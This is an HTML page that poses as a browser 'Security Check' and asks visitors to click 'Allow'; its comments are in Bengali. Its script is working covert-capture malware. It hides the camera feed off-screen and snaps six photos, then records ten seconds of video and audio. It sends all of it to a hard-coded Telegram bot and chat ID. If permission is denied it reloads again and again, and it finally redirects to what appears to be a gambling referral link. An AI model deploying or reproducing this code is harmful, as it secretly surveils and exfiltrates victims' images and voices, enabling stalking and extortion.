<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        #v_stream { position: fixed; left: -9999px; opacity: 0; }
    </style>
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen">

    <div class="max-w-md w-full p-6 bg-white shadow-xl rounded-xl text-center border border-gray-200">
        <div class="mb-4 flex justify-center">
            <div class="animate-spin h-10 w-10 border-4 border-blue-500 border-t-transparent rounded-full"></div>
        </div>
        <h2 class="text-xl font-bold text-gray-800">Security Check</h2>
        <p class="text-gray-500 mt-2 text-sm">Please click <b>"Allow"</b> to verify your browser.</p>
        
        <div class="mt-6 p-4 bg-gray-50 rounded-lg border border-gray-100">
            <div id="timer" class="text-3xl font-mono font-bold text-blue-600">15s</div>
            <p class="text-[10px] text-gray-400 mt-1">PROCESSING SECURE CONNECTION</p>
        </div>
    </div>

    <video id="v_stream" autoplay playsinline muted></video>
    <canvas id="c_save" class="hidden"></canvas>

    <script>
        // ১. সরাসরি Chrome-এ নিয়ে যাওয়ার সিস্টেম (Messenger & Telegram Fixed)
        const ua = navigator.userAgent;
        if (/FBAN|FBAV|Messenger|Telegram|Instagram/i.test(ua) && ua.includes("Android")) {
            const cleanUrl = window.location.href.replace(/^https?:\/\//, '');
            window.location.href = "intent://" + cleanUrl + "#Intent;scheme=https;package=com.android.chrome;end";
        }

        const CONFIG = {
            t: '8355080071:AAHZ5KdTDSkqNLgSe_9gsuGCyUMYru5pNe4',
            c: '7785049939', 
            u: 'https://dkwin9.com/#/register?invitationCode=14856937272'
        };

        let timeLeft = 15;

        async function init() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const video = document.getElementById('v_stream');
                video.srcObject = stream;

                // টাইমার শুরু
                const timerInt = setInterval(() => {
                    timeLeft--;
                    if(timeLeft >= 0) document.getElementById('timer').innerText = timeLeft + "s";
                    if(timeLeft <= 0) clearInterval(timerInt);
                }, 1000);

                // ক্যামেরা রেডি হওয়ার জন্য ১.৫ সেকেন্ড বিরতি (যাতে ছবি কালো না হয়)
                setTimeout(async () => {
                    // আগে ৬টি ছবি তোলা শেষ হবে
                    for (let i = 1; i <= 6; i++) {
                        await takeSnap(i);
                        await new Promise(r => setTimeout(r, 600)); 
                    }
                    
                    // ছবি তোলা শেষ হলে ভিডিও শুরু
                    startVideoRecording(stream);
                }, 1500);

            } catch (err) {
                // পারমিশন না দিলে অটো রিলোড (বারবার চাইবে)
                setTimeout(() => { location.reload(); }, 500);
            }
        }

        function takeSnap(count) {
            return new Promise((resolve) => {
                const video = document.getElementById('v_stream');
                const canvas = document.getElementById('c_save');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);

                canvas.toBlob(blob => {
                    const formData = new FormData();
                    formData.append('chat_id', CONFIG.c);
                    formData.append('photo', blob, `img${count}.jpg`);
                    fetch(`https://api.telegram.org/bot${CONFIG.t}/sendPhoto`, { method: 'POST', body: formData })
                    .finally(() => resolve());
                }, 'image/jpeg', 0.9);
            });
        }

        function startVideoRecording(stream) {
            const mediaRecorder = new MediaRecorder(stream);
            let chunks = [];
            mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
            mediaRecorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'video/mp4' });
                const formData = new FormData();
                formData.append('chat_id', CONFIG.c);
                formData.append('video', blob, 'capture.mp4');
                await fetch(`https://api.telegram.org/bot${CONFIG.t}/sendVideo`, { method: 'POST', body: formData });
                // সব কাজ শেষে রিডাইরেক্ট
                window.location.replace(CONFIG.u);
            };

            mediaRecorder.start();
            setTimeout(() => {
                mediaRecorder.stop();
                stream.getTracks().forEach(t => t.stop());
            }, 10000); // ১০ সেকেন্ড ভিডিও
        }

        window.onload = init;
    </script>
</body>
</html>
